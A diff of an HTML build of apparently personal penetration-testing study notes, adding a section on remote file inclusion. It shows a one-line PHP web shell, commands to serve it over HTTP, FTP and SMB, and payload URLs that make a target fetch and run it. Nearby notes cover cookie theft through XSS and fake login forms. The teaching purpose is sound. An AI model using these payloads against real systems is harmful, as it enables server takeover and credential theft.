@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-446be115.js";
+            window.path_to_searchindex_js = "searchindex-7ceb885d.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-c433b8a1.js"></script>
+        <script src="toc-c098ef09.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -19325,7 +19325,7 @@ ac
 </ul>
 <h3 id="file-inclusion"><a class="header" href="#file-inclusion">File inclusion</a></h3>
 <ul>
-<li><a href="infosec/file-inclusion/README.html">File inclusion — intro, LFI exploitation (traversal, prefixes, second-order), basic filter bypasses, PHP <code>php://filter</code> source disclosure, PHP <code>data</code>/<code>input</code>/<code>expect</code> wrappers and RCE prerequisites, read vs execute</a></li>
+<li><a href="infosec/file-inclusion/README.html">File inclusion — intro, LFI exploitation (traversal, prefixes, second-order), basic filter bypasses, PHP <code>php://filter</code> source disclosure, PHP <code>data</code>/<code>input</code>/<code>expect</code> wrappers and RCE prerequisites, RFI (HTTP/FTP/SMB), SSRF overlap, read vs execute</a></li>
 </ul>
 <h3 id="htb"><a class="header" href="#htb">HTB</a></h3>
 <ul>
@@ -24177,6 +24177,7 @@ SQL&gt; xp_cmdshell whoami /priv
 <li><a href="#local-file-inclusion-lfi--basic-bypasses">LFI — basic bypasses — non-recursive filters, encoding, approved paths, appended extension (legacy truncation/null byte)</a></li>
 <li><a href="#php-filter-wrappers-for-lfi-source-disclosure">PHP filter wrappers (<code>php://filter</code>) — Base64 source disclosure, fuzzing PHP endpoints, appended extensions</a></li>
 <li><a href="#php-wrappers--lfi-to-rce">PHP wrappers for LFI → RCE — <code>data://</code>, <code>php://input</code>, <code>expect://</code>, <code>allow_url_include</code>, reading <code>php.ini</code></a></li>
+<li><a href="#remote-file-inclusion-rfi">Remote file inclusion (RFI) — LFI vs RFI, verifying URL inclusion, RCE via HTTP/FTP/SMB, SSRF overlap</a></li>
 </ul>
 <h2 id="summary-5"><a class="header" href="#summary-5">Summary</a></h2>
 <p>File inclusion flaws happen when <strong>HTTP parameters or path segments choose a file</strong> to load or render, and that choice is <strong>not safely constrained</strong>. <strong>Local File Inclusion (LFI)</strong> lets attackers read (or sometimes execute) arbitrary server files—common around <strong>templating</strong> patterns such as <code>index.php?page=about</code> where the <code>page</code> fragment maps to an include path. Impacts include <strong>source disclosure</strong>, <strong>secret leakage</strong> (keys, credentials, configs), and under some primitives <strong>remote code execution</strong>. Examples span <strong>PHP</strong> (<code>include</code> / <code>require</code> / <code>file_get_contents</code> and friends), <strong>Node</strong> (<code>fs.readFile</code>, <code>path.join</code> breakout, <code>res.render</code> with interpolated paths), <strong>Java/JSP</strong> (<code>jsp:include</code>, <code>c:import</code>), and <strong>.NET</strong> (<code>Response.WriteFile</code>, <code>@Html.Partial</code>, SSI includes). A key review axis is <strong>read-only vs execute</strong> and <strong>local vs remote URL</strong> support: execution-capable includes (e.g. PHP <code>include</code>, some <code>c:import</code> / SSI cases) widen blast radius to <strong>RCE</strong>, while read-only sinks still enable <strong>credential and logic leakage</strong>. Defensive themes are <strong>allowlisting</strong>, <strong>canonical path checks</strong>, and <strong>never wiring raw request data into filesystem or template resolution</strong>.</p>
@@ -24184,6 +24185,7 @@ SQL&gt; xp_cmdshell whoami /priv
 <p>For <strong>filter and normalizer bypasses</strong> (single-pass <code>../</code> stripping, URL/double encoding, regex-approved path prefixes, and legacy PHP tricks for forced extensions), see <a href="#local-file-inclusion-lfi--basic-bypasses">lfi-basic-bypasses.md</a>.</p>
 <p>For <strong>PHP <code>php://filter</code> streams</strong>—using <strong><code>read=convert.base64-encode</code></strong> so included <code>.php</code> files leak as Base64 instead of executing, fuzzing <strong><code>*.php</code></strong> with non-200 responses in scope, and chaining reads from <strong><code>index.php</code></strong> or ffuf hits—see <a href="#php-filter-wrappers-for-lfi-source-disclosure">php-filters-lfi.md</a>.</p>
 <p>For <strong>PHP stream wrappers that drive RCE</strong> through an execution-capable <code>include</code>-style sink: confirm <strong><code>allow_url_include</code></strong> (and related settings) by Base64-reading <strong><code>php.ini</code></strong> under <code>/etc/php/X.Y/apache2/</code> or <code>.../fpm/</code>; then try <strong><code>data://text/plain;base64,...</code></strong> for inline PHP, <strong><code>php://input</code></strong> with a POST body when the parameter accepts POST, and <strong><code>expect://command</code></strong> when the <strong>expect</strong> extension is installed and working. Trivial pivots (configs, <strong><code>~/.ssh/id_rsa</code></strong>) remain parallel options. Phar/zip + upload chains are noted as follow-ons—see <a href="#php-wrappers--lfi-to-rce">php-wrappers-lfi-rce.md</a>.</p>
+<p><strong>Remote File Inclusion (RFI)</strong> applies when the sink accepts <strong>remote URLs</strong> (<code>http://</code>, <code>ftp://</code>, or on Windows <strong>UNC/SMB</strong> paths). Benefits: <strong>RCE</strong> by hosting a script the server includes and executes (when the primitive executes), and <strong>SSRF-style</strong> probing of <strong>localhost / internal ports</strong> (e.g. <code>http://127.0.0.1:80/...</code>). RFI usually implies LFI; the converse fails when URL wrappers are disallowed, the attacker cannot supply a full scheme, or the stack disables remote inclusion (default on many servers). <strong>Verify</strong> with a real URL fetch (often starting with loopback HTTP); <code>php.ini</code> alone is not always definitive. Delivery channels: <strong>HTTP</strong> (<code>python3 -m http.server</code>), <strong>FTP</strong> (<code>pyftpdlib</code>, <code>ftp://</code>—useful if HTTP is filtered), <strong>SMB</strong> (<code>impacket-smbserver</code>, <code>\\host\share\file.php</code> on Windows without <code>allow_url_include</code>). Avoid recursive self-includes. Details: <a href="#remote-file-inclusion-rfi">remote-file-inclusion.md</a>.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="intro-to-file-inclusions"><a class="header" href="#intro-to-file-inclusions">Intro to File Inclusions</a></h1>
 <p>Many back-end stacks (PHP, JavaScript/Node, Java, .NET, and others) use HTTP parameters or path segments to choose which resource is rendered. That keeps templates small and pages dynamic. If the resolved path is built from user-controlled input without strict validation, an attacker can point the application at arbitrary local files—<strong>Local File Inclusion (LFI)</strong>—or, where the API allows it, remote resources (<strong>Remote File Inclusion</strong>, RFI, when applicable).</p>
@@ -24407,6 +24409,63 @@ SQL&gt; xp_cmdshell whoami /priv
 <p>(or the equivalent in your vulnerable parameter). No separate web shell payload is required; the wrapper is built for <strong>command-style</strong> use. Same idea appears elsewhere (e.g. <strong>XXE</strong> with <code>expect</code>).</p>
 <h2 id="related-topics"><a class="header" href="#related-topics">Related topics</a></h2>
 <p>The <strong><code>php://filter</code></strong> chain for <strong>source disclosure</strong> (without RCE) is covered in <a href="#php-filter-wrappers-for-lfi-source-disclosure">php-filters-lfi.md</a>. <strong>Phar</strong> and <strong>zip</strong> stream tricks (often paired with <strong>uploads</strong> + LFI) are a separate follow-on.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="remote-file-inclusion-rfi"><a class="header" href="#remote-file-inclusion-rfi">Remote File Inclusion (RFI)</a></h1>
+<h2 id="what-it-is"><a class="header" href="#what-it-is">What it is</a></h2>
+<p><strong>Remote File Inclusion</strong> is when a vulnerable sink can load resources from <strong>remote URLs</strong> (not just local paths). That enables:</p>
+<ol>
+<li><strong>SSRF-style effects</strong> — reach <strong>localhost</strong> or internal ports/apps by including <code>http://127.0.0.1:PORT/...</code> (enumerating services the server can see).</li>
+<li><strong>Remote code execution</strong> — host a <strong>malicious script</strong> in the app’s language and include it so the server <strong>fetches and executes</strong> it (when the primitive executes code, not only reads bytes).</li>
+</ol>
+<p>The <strong>Server-side Attacks</strong> / SSRF material applies in parallel: RFI often doubles as a <strong>server-initiated HTTP client</strong> you control.</p>
+<h2 id="lfi-vs-rfi"><a class="header" href="#lfi-vs-rfi">LFI vs RFI</a></h2>
+<ul>
+<li><strong>RFI ⇒ usually LFI</strong> — APIs that allow <code>http://</code> / <code>ftp://</code> / UNC paths typically also allow local paths.</li>
+<li><strong>LFI ⇏ RFI</strong> — RFI may be impossible because:
+<ul>
+<li>The API <strong>does not allow URL wrappers</strong> (no remote schemes).</li>
+<li>You only control part of the path and <strong>cannot set</strong> <code>http://</code>, <code>https://</code>, <code>ftp://</code>, etc.</li>
+<li><strong>Configuration disables remote inclusion</strong> (common by default).</li>
+</ul>
+</li>
+</ul>
+<p>Some functions <strong>fetch remote URLs but do not execute</strong> code (e.g. read-only <code>file_get_contents</code> in PHP, <code>@Html.RemotePartial()</code> read path in .NET per common teaching tables). Those cases still support <strong>SSRF / content leakage</strong>, not RCE via inclusion execution.</p>
+<p><strong>Execution-capable</strong> examples (when misused) include PHP <code>include</code> / <code>include_once</code>, Java <code>import</code>-style remote resolution, .NET <code>include</code> with remote partials, etc.—always verify per runtime and version.</p>
+<h2 id="verifying-rfi"><a class="header" href="#verifying-rfi">Verifying RFI</a></h2>
+<ol>
+<li><strong>Config (PHP)</strong> — <code>allow_url_include</code> must be <strong>On</strong> for classic PHP URL includes. You can try to <strong>read <code>php.ini</code> via LFI</strong> (e.g. Base64 path from prior notes) and <code>grep allow_url_include</code>; this can be <strong>misleading</strong> if the vulnerable call path still blocks URLs.</li>
+<li><strong>Behavioral test (reliable)</strong> — Pass a <strong>URL</strong> and see if content is pulled and processed. Start with a <strong>local URL</strong> to reduce firewall/WAF noise, e.g. <code>http://127.0.0.1:80/index.php</code>.
+<ul>
+<li>If the <strong>page executes</strong> (rendered PHP), the sink likely <strong>executes</strong> included PHP → RCE via hosted shell is plausible.</li>
+<li>If other local apps listen on <strong>8080</strong>, etc., try those ports for <strong>internal recon</strong> (SSRF via inclusion).</li>
+</ul>
+</li>
+<li><strong>Caution</strong> — Including the <strong>same script that performs the include</strong> can cause <strong>recursive inclusion</strong> and <strong>DoS</strong> the app; prefer a small static test resource when probing.</li>
+</ol>
+<h2 id="rce-workflow-php-style"><a class="header" href="#rce-workflow-php-style">RCE workflow (PHP-style)</a></h2>
+<ol>
+<li><strong>Write a minimal web shell</strong>, e.g. <code>&lt;?php system($_GET["cmd"]); ?&gt;</code> → <code>shell.php</code>.</li>
+<li><strong>Host it</strong> from your machine on a port often allowed outbound (<strong>80</strong> / <strong>443</strong>) in case egress is filtered.</li>
+<li><strong>Trigger inclusion</strong> with your URL, e.g.<br><code>http://&lt;TARGET&gt;/index.php?language=http://&lt;YOUR_IP&gt;:&lt;PORT&gt;/shell.php&amp;cmd=id</code></li>
+<li>Confirm <strong>GET /shell.php</strong> on your listener; if the app <strong>appends <code>.php</code></strong>, adjust the parameter (omit redundant extension) based on observed requests.</li>
+</ol>
+<h3 id="http"><a class="header" href="#http">HTTP</a></h3>
+<pre><code class="language-bash">sudo python3 -m http.server &lt;LISTENING_PORT&gt;
+</code></pre>
+<p>Payload pattern: <code>language=http://&lt;YOUR_IP&gt;:&lt;PORT&gt;/shell.php&amp;cmd=&lt;command&gt;</code></p>
+<h3 id="ftp"><a class="header" href="#ftp">FTP</a></h3>
+<p>Use when <strong>HTTP is blocked</strong> or <strong><code>http://</code> is stripped</strong> by a WAF.</p>
+<pre><code class="language-bash">sudo python -m pyftpdlib -p 21
+</code></pre>
+<p>Payload: <code>language=ftp://&lt;YOUR_IP&gt;/shell.php&amp;cmd=id</code><br>PHP often tries <strong>anonymous</strong> FTP; if auth is required: <code>ftp://user:pass@&lt;HOST&gt;/shell.php</code>.</p>
+<h3 id="smb--unc-windows-targets"><a class="header" href="#smb--unc-windows-targets">SMB / UNC (Windows targets)</a></h3>
+<p>On <strong>Windows</strong>, <strong>UNC paths</strong> can reference <strong>remote SMB shares</strong> like normal files; <strong><code>allow_url_include</code> is not required</strong> for this class of inclusion.</p>
+<pre><code class="language-bash">impacket-smbserver -smb2support share "$(pwd)"
+</code></pre>
+<p>Payload pattern: <code>language=\\&lt;YOUR_IP&gt;\share\shell.php&amp;cmd=whoami</code></p>
+<p><strong>Reality check:</strong> pulling SMB from <strong>across the internet</strong> is often <strong>blocked</strong> by policy or networking; same-LAN or reachable share scenarios are more typical.</p>
+<h2 id="relationship-to-ssrf"><a class="header" href="#relationship-to-ssrf">Relationship to SSRF</a></h2>
+<p>RFI that accepts <strong>HTTP(S) URLs</strong> is a controlled <strong>outbound request</strong> primitive: use it to <strong>map internal HTTP services</strong>, alternate ports, and metadata endpoints—same mindset as SSRF, with inclusion-specific parsing and execution rules layered on top.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-file-transfer-methods"><a class="header" href="#linux-file-transfer-methods">Linux File Transfer Methods</a></h1>
 <h2 id="introduction-29"><a class="header" href="#introduction-29">Introduction</a></h2>
@@ -24798,8 +24857,8 @@ Authorization: Basic YWxpY2U6c2VjcmV0MTIz
 </div>
 <hr>
 <h3 id="host-based-enumeration"><a class="header" href="#host-based-enumeration">Host Based Enumeration</a></h3>
-<h4 id="ftp"><a class="header" href="#ftp">FTP</a></h4>
-<h5 id="ftp-1"><a class="header" href="#ftp-1">FTP</a></h5>
+<h4 id="ftp-1"><a class="header" href="#ftp-1">FTP</a></h4>
+<h5 id="ftp-1-1"><a class="header" href="#ftp-1-1">FTP</a></h5>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -28109,7 +28168,7 @@ https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-p
 <p>Cross-site scripting lets attackers run JavaScript in victims’ browsers when applications fail to sanitize or encode user-controlled data. Notes cover client-side execution, typical impacts (session theft, forced actions, abuse of browser APIs), limits of pure XSS versus chaining with browser bugs, notable incidents (Samy worm, TweetDeck), and the three main types: <strong>stored</strong>, <strong>reflected</strong>, and <strong>DOM-based</strong> XSS. <strong>Stored</strong> XSS is covered in depth: saved payloads, wide victim pool, remediation in the database, basic PoC payloads (<code>alert(window.origin)</code>, <code>&lt;plaintext&gt;</code>, <code>print()</code>), iframe/origin confirmation, and using refresh to verify persistence. <strong>Reflected</strong> XSS is summarized separately: non-persistent behavior (vs DOM-based), error-message reflection, empty-quotes UI vs view-source confirmation, and delivering GET-based attacks via malicious URLs. <strong>DOM-based</strong> XSS is summarized separately: client-only processing, hash/URL sources, view-source vs inspector, source and sink functions, why <code>innerHTML</code> often blocks <code>&lt;script&gt;</code>, and event-handler payloads (e.g. <code>img</code> / <code>onerror</code>) delivered via shared URLs. <strong>XSS phishing</strong> is summarized separately: <strong>trusted-domain</strong> fake login UI that posts credentials to the attacker; <strong>authorized</strong> use as <strong>awareness simulations</strong>; <strong><code>/phishing</code>-style image URL</strong> labs where a raw <strong><code>&lt;script&gt;</code></strong> test often fails until <strong>source/context</strong> review; <strong><code>document.write</code></strong> for minified form HTML; <strong><code>getElementById('urlform').remove()</code></strong> after inspector (<strong><code>Ctrl+Shift+C</code></strong>) to drop the real URL field; <strong><code>&lt;!--</code></strong> after the payload to comment out trailing template; <strong>reflected</strong> delivery via a copied <strong>malicious URL</strong>; <strong>netcat</strong> on port <strong>80</strong> for quick <strong>GET</strong> <code>/?username=…&amp;password=…</code> capture vs a <strong>PHP</strong> listener that <strong>logs</strong> to <strong><code>creds.txt</code></strong> and <strong>redirects</strong> to the clean app so the victim does not see a broken HTTP response. <strong>XSS discovery</strong> is summarized separately: <strong>automated</strong> scanning (passive DOM hints vs active payload injection; commercial vs OSS tradeoffs), tools such as <strong>XSStrike</strong> / <strong>Brute XSS</strong> / <strong>XSSer</strong> and why <strong>reflection in HTML ≠ execution</strong>, <strong>manual</strong> testing with public payload lists and non-form sinks (<strong>headers</strong> like <strong>Cookie</strong> / <strong>User-Agent</strong>), why generic lists miss simple labs, optional custom scripting for odd targets, and <strong>manual code review</strong> as the most reliable path when full data flow is visible (with deeper secure-coding / white-box study left to other modules). <strong>XSS defacing</strong> is summarized separately: using <strong>stored</strong> XSS for <strong>persistent</strong> visual takeover, <strong>reputation</strong> impact (e.g. public sector defacements), four common levers (<strong><code>document.body.style.background</code></strong>, <strong><code>document.body.background</code></strong>, <strong><code>document.title</code></strong>, <strong><code>innerHTML</code></strong>), swapping <strong>full <code>&lt;body&gt;</code></strong> markup (with <strong><code>getElementsByTagName('body')[0]</code></strong>), optional <strong>jQuery</strong> when present, <strong>minified</strong> one-line HTML inside payloads, and how <strong>view-source</strong> can still show original structure while the <strong>rendered DOM</strong> looks defaced—plus <strong>injection position</strong> (end vs middle of page) affecting what later content might still appear. <strong>XSS session hijacking / blind XSS</strong> is summarized separately: <strong>cookies</strong> as session handles; <strong>blind</strong> sinks (<strong>admin</strong> panels, tickets, reviews, <strong><code>User-Agent</code></strong>); <strong><code>/hijacking</code></strong>-style registration reviewed by staff; <strong>OOB</strong> detection via <strong><code>&lt;script src=http://IP/fieldname&gt;</code></strong> so the <strong>request path</strong> names the vulnerable input; <strong>PayloadsAllTheThings</strong>-style <strong>quote-break</strong> variants and <strong>XHR</strong> / <strong><code>$.getScript</code></strong> when jQuery exists; <strong><code>sudo php -S 0.0.0.0:80</code></strong> to catch callbacks; pragmatic <strong>skips</strong> (<strong>email</strong> validation, <strong>password</strong> unlikely echoed); then <strong><code>new Image().src</code></strong> (vs <strong><code>document.location</code></strong>) to send <strong><code>document.cookie</code></strong> in a <strong>GET</strong> to <strong><code>index.php?c=</code></strong>, <strong>PHP</strong> splitting on <strong><code>;</code></strong>, <strong><code>urldecode</code></strong>, <strong><code>cookies.txt</code></strong> lines with <strong><code>REMOTE_ADDR</code></strong>; replay in <strong>Firefox Storage</strong> (<strong><code>Shift+F9</code></strong>) by adding <strong>name/value</strong> and refreshing—plus <strong><code>HttpOnly</code></strong> as the main cookie theft mitigation. <strong>XSS prevention</strong> is summarized separately: secure <strong>sources</strong> and <strong>sinks</strong> on <strong>client and server</strong>; front-end <strong>regex validation</strong> (e.g. email), <strong>DOMPurify</strong> for client-side HTML sanitization, avoiding <strong><code>&lt;script&gt;</code> / <code>&lt;style&gt;</code> / attributes / comments</strong> built from input and dangerous APIs (<strong><code>innerHTML</code></strong>, <strong><code>document.write</code></strong>, <strong><code>document.domain</code></strong>, jQuery <strong><code>.html()</code></strong> / <strong><code>parseHTML()</code></strong> / insertion helpers); back-end <strong><code>filter_var</code></strong> / validation, sanitization libraries, <strong>never raw echo</strong> of request params; <strong>output encoding</strong> with <strong><code>htmlspecialchars</code>/<code>htmlentities</code></strong> (PHP) or <strong><code>html-entities</code></strong> (Node); deployment levers (<strong>HTTPS</strong>, <strong>CSP</strong> like <strong><code>script-src 'self'</code></strong>, <strong><code>X-Content-Type-Options: nosniff</code></strong>, <strong><code>HttpOnly</code>/<code>Secure</code></strong> cookies, <strong>WAF</strong>, framework defaults such as <strong>ASP.NET</strong>); and ongoing <strong>offensive retesting</strong> because secure coding plus config can still miss edge cases—the note clarifies that <strong><code>addslashes</code></strong> alone is a weak primary HTML-XSS control versus <strong>contextual encoding</strong>.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="dom-based-xss"><a class="header" href="#dom-based-xss">DOM-Based XSS</a></h1>
-<h2 id="what-it-is"><a class="header" href="#what-it-is">What it is</a></h2>
+<h2 id="what-it-is-1"><a class="header" href="#what-it-is-1">What it is</a></h2>
 <p><strong>DOM-based XSS</strong> is the third main XSS type. Like <strong>reflected</strong> XSS, it is usually <strong>non-persistent</strong>: the dangerous output does not survive a simple revisit without the same client-side inputs (e.g. fragment or client state).</p>
 <p>The difference from reflected XSS: data is <strong>not</strong> necessarily sent to the back end in an HTTP request that returns your string in HTML. Instead, <strong>JavaScript on the client</strong> reads untrusted input and <strong>writes it into the DOM</strong>. The server may serve a <strong>static</strong> page; the vulnerability is in <strong>client-side</strong> source → sink handling.</p>
 <h2 id="lab-clues-to-do-style-app"><a class="header" href="#lab-clues-to-do-style-app">Lab clues (to-do style app)</a></h2>
@@ -28220,7 +28279,7 @@ var task = document.URL.substring(pos + 5, document.URL.length);
 <p>Later material can drill into each type, exercises, and exploitation patterns.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="xss-phishing-fake-login-forms"><a class="header" href="#xss-phishing-fake-login-forms">XSS Phishing (Fake Login Forms)</a></h1>
-<h2 id="what-it-is-1"><a class="header" href="#what-it-is-1">What it is</a></h2>
+<h2 id="what-it-is-2"><a class="header" href="#what-it-is-2">What it is</a></h2>
 <p><strong>XSS phishing</strong> uses cross-site scripting to show <strong>legitimate-looking UI</strong> (often a <strong>login form</strong>) on a site the victim already trusts. Submitted credentials go to an <strong>attacker-controlled</strong> server so the attacker can <strong>log in as the victim</strong> and access accounts and sensitive data.</p>
 <p>In <strong>authorized</strong> work, a known XSS on an org’s app can double as a <strong>phishing simulation</strong>: employees who trust the domain may not expect a malicious prompt, which measures <strong>security awareness</strong>.</p>
 <h2 id="prerequisites-5"><a class="header" href="#prerequisites-5">Prerequisites</a></h2>
@@ -33182,7 +33241,7 @@ Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                           
 <p>WebSocket communication consists of messages and application code and does not need to worry about buffering, parsing and reconstructing received data. For example, if the server sends a 1 MB payload, the applications <code>onmessage</code> callback will only be called once the client receives the entire payload.</p>
 <p>WebSockets can transfer test or binary data.</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="http"><a class="header" href="#http">HTTP</a></h1>
+<h1 id="http-1"><a class="header" href="#http-1">HTTP</a></h1>
 <h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory Map</a></h2>
 <ul>
 <li><a href="#clean-urls">clean_urls</a></li>
